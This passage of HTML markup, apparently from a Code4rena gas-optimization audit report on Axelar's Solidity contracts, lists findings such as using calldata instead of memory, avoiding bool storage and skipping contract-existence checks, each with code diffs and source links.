2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><code>MultisigBase.sol</code>:</h3>\n<p><code>newAccounts</code> can be <code>calldata</code> instead of <code>memory</code>: Saves <code>282 GAS</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/cgp/auth/MultisigBase.sol#L142-L144\">https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/cgp/auth/MultisigBase.sol#L142-L144</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"59\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: 2023-07-axelar/contracts/cgp/auth/MultisigBase.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 142: function rotateSigners(address[] memory newAccounts, uint256 newThreshold) external virtual onlySigners {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 142: function rotateSigners(address[] calldata newAccounts, uint256 newThreshold) external virtual onlySigners {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">143:        _rotateSigners(newAccounts, newThreshold);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">144:    }</span></span></span></code></pre>\n<h3 id=\"interchainproposalsendersol\" style=\"position:relative;\"><a href=\"#interchainproposalsendersol\" aria-label=\"interchainproposalsendersol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><code>InterchainProposalSender.sol</code>:</h3>\n<p><code>destinationChain</code> and <code>destinationContract</code> can be <code>calldata</code> instead of <code>memory</code>: Saves <code>564 GAS</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/interchain-governance-executor/InterchainProposalSender.sol#L81\">https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/interchain-governance-executor/InterchainProposalSender.sol#L81</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"60\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: 2023-07-axelar/contracts/interchain-governance-executor/InterchainProposalSender.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">80: function sendProposal(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 81:        string memory destinationChain,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 81:        string calldata destinationChain,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 82:        string memory destinationContract,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 82:        string calldata destinationContract,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">83:        InterchainCalls.Call[] calldata calls</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">84:    ) external payable override {</span></span></span></code></pre>\n<h3 id=\"constaddressdeployersol\" style=\"position:relative;\"><a href=\"#constaddressdeployersol\" aria-label=\"constaddressdeployersol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><code>ConstAddressDeployer.sol</code>:</h3>\n<p><code>bytecode</code> and <code>bytecode</code> can be <code>calldata</code> instead of <code>memory</code>: Saves <code>564 GAS</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/gmp-sdk/deploy/ConstAddressDeployer.sol#L24\">https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/gmp-sdk/deploy/ConstAddressDeployer.sol#L24</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"61\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: Breadcrumbs2023-07-axelar/contracts/gmp-sdk/deploy/ConstAddressDeployer.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 24: function deploy(bytes memory bytecode, bytes32 salt) external returns (address deployedAddress_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 24: function deploy(bytes calldata bytecode, bytes32 salt) external returns (address deployedAddress_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">42: function deployAndInit(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 43:         bytes memory bytecode,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ 43:         bytes calldata bytecode,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">44:        bytes32 salt,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">45:        bytes calldata init</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">46:    ) external returns (address deployedAddress_) {</span></span></span></code></pre>\n</details>\n<h2 id=\"g-03-avoiding-the-overhead-of-bool-storage\" style=\"position:relative;\"><a href=\"#g-03-avoiding-the-overhead-of-bool-storage\" aria-label=\"g 03 avoiding the overhead of bool storage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-03] Avoiding the overhead of <code>bool</code> storage</h2>\n<p>Saves <code>120600 GAS</code> in 6 instances.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"62\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Booleans are more expensive than uint256 or any type that takes up a full</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // word because each write operation emits an extra SLOAD to first read the</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // slot&#39;s contents, replace the bits taken up by the boolean, and then write</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // back. This is the compiler&#39;s defense against contract upgrades and</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // pointer aliasing, and it cannot be disabled.</span></span></code></pre>\n<p><a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27\">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27</a></p>\n<p>Use <code>uint256(1)</code> and <code>uint256(2)</code> for true/false to avoid a <code>Gwarmaccess</code> <code>(100 gas)</code> for the extra <code>SLOAD</code>, and to avoid <code>Gsset</code> <code>(20000 gas)</code> when changing from false to true, after having been true in the past.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"63\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: </span><span class=\"mtk7\">2023</span><span class=\"mtk1\">-</span><span class=\"mtk7\">07</span><span class=\"mtk1\">-</span><span class=\"mtk12\">axelar</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">cgp</span><span class=\"mtk1\">/</span><span class=\"mtk12\">auth</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MultisigBase</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">15</span><span class=\"mtk1\">: </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">hasVoted</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">21</span><span class=\"mtk1\">: </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">isSigner</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/cgp/auth/MultisigBase.sol#L15\">https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/cgp/auth/MultisigBase.sol#L15</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"64\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: </span><span class=\"mtk7\">2023</span><span class=\"mtk1\">-</span><span class=\"mtk7\">07</span><span class=\"mtk1\">-</span><span class=\"mtk12\">axelar</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">cgp</span><span class=\"mtk1\">/</span><span class=\"mtk12\">governance</span><span class=\"mtk1\">/</span><span class=\"mtk12\">AxelarServiceGovernance</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">22</span><span class=\"mtk1\">: </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">multisigApprovals</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/cgp/governance/AxelarServiceGovernance.sol#L22\">https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/cgp/governance/AxelarServiceGovernance.sol#L22</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"65\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: </span><span class=\"mtk7\">2023</span><span class=\"mtk1\">-</span><span class=\"mtk7\">07</span><span class=\"mtk1\">-</span><span class=\"mtk12\">axelar</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interchain</span><span class=\"mtk1\">-</span><span class=\"mtk12\">governance</span><span class=\"mtk1\">-</span><span class=\"mtk12\">executor</span><span class=\"mtk1\">/</span><span class=\"mtk12\">InterchainProposalExecutor</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">24</span><span class=\"mtk1\">: </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">whitelistedCallers</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">27</span><span class=\"mtk1\">: </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">whitelistedSenders</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/interchain-governance-executor/InterchainProposalExecutor.sol#L24\">https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/interchain-governance-executor/InterchainProposalExecutor.sol#L24</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"66\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: </span><span class=\"mtk7\">2023</span><span class=\"mtk1\">-</span><span class=\"mtk7\">07</span><span class=\"mtk1\">-</span><span class=\"mtk12\">axelar</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">its</span><span class=\"mtk1\">/</span><span class=\"mtk12\">remote</span><span class=\"mtk1\">-</span><span class=\"mtk12\">address</span><span class=\"mtk1\">-</span><span class=\"mtk12\">validator</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RemoteAddressValidator</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">19</span><span class=\"mtk1\">: </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">supportedByGateway</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/remote-address-validator/RemoteAddressValidator.sol#L19\">https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/remote-address-validator/RemoteAddressValidator.sol#L19</a></p>\n<h2 id=\"g-04-avoid-contract-existence-checks-by-using-low-level-calls\" style=\"position:relative;\"><a href=\"#g-04-avoid-contract-existence-checks-by-using-low-level-calls\" aria-label=\"g 04 avoid contract existence checks by using low level calls permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-04] Avoid contract existence checks by using low level calls</h2>\n<p>Saves <code>3700 GAS</code> in 37 instances.</p>\n<p>Prior to 0.8.10, the compiler inserted extra code, including <code>EXTCODESIZE</code> (100 gas), to check for contract existence for external function calls. In more recent solidity versions, the compiler will not insert these checks if the external call has a return value. Similar behavior can be achieved in earlier versions by using low-level calls, since low level calls never check for contract existence.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"67\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">FILE: </span><span class=\"mtk12\">Breadcrumbs2023</span><span class=\"mtk1\">-</span><span class=\"mtk7\">07</span><span class=\"mtk1\">-</span><span class=\"mtk12\">axelar</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">its</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interchain</span><span class=\"mtk1\">-</span><span class=\"mtk12\">token</span><span class=\"mtk1\">-</span><span class=\"mtk12\">service</span><span class=\"mtk1\">/</span><span class=\"mtk12\">InterchainTokenService</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">102</span><span class=\"mtk1\">: </span><span class=\"mtk12\">deployer</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ITokenManagerDeployer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenManagerDeployer_</span><span class=\"mtk1\">).</span><span class=\"mtk11\">deployer</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">162</span><span class=\"mtk1\">: </span><span class=\"mtk12\">tokenManagerAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">deployer</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deployedAddress</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">172</span><span class=\"mtk1\">: </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">ITokenManagerProxy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenManagerAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">tokenId</span><span class=\"mtk1\">() != </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">TokenManagerDoesNotExist</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">182</span><span class=\"mtk1\">: </span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ITokenManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenManagerAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">tokenAddress</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">193</span><span class=\"mtk1\">: </span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">deployer</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deployedAddress</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">277</span><span class=\"mtk1\">: </span><span class=\"mtk12\">flowLimit</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">tokenManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getFlowLimit</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">287</span><span class=\"mtk1\">: </span><span class=\"mtk12\">flowOutAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">tokenManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getFlowOutAmount</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">297</span><span class=\"mtk1\">: </span><span class=\"mtk12\">flowInAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">tokenManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getFlowInAmount</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">311</span><span class=\"mtk1\">: </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">gateway</span><span class=\"mtk1\">.</span><span class=\"mtk11\">tokenAddresses</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenSymbol</span><span class=\"mtk1\">) == </span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">GatewayToken</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">331</span><span class=\"mtk1\">: </span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ITokenManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">tokenAddress</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">445</span><span class=\"mtk1\">: </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">gateway</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isCommandExecuted</span><span class=\"mtk1\">(</span><span class=\"mtk12\">commandId</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AlreadyExecuted</span><span class=\"mtk1\">(</span><span class=\"mtk12\">commandId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">476</span><span class=\"mtk1\">: </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">gateway</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isCommandExecuted</span><span class=\"mtk1\">(</span><span class=\"mtk12\">commandId</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AlreadyExecuted</span><span class=\"mtk1\">(</span><span class=\"mtk12\">commandId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">480</span><span class=\"mtk1\">: </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">tokenAddress</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">539</span><span class=\"mtk1\">: </span><span class=\"mtk12\">tokenManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setFlowLimit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">flowLimits</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">566</span><span class=\"mtk1\">:  </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">ITokenManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">implementation</span><span class=\"mtk1\">).</span><span class=\"mtk11\">implementationType</span><span class=\"mtk1\">() != </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenManagerType</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidTokenManagerImplementation</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">610</span><span class=\"mtk1\">: </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">tokenManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">giveToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">653</span><span class=\"mtk1\">: </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">tokenManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">giveToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">expressCaller</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">657</span><span 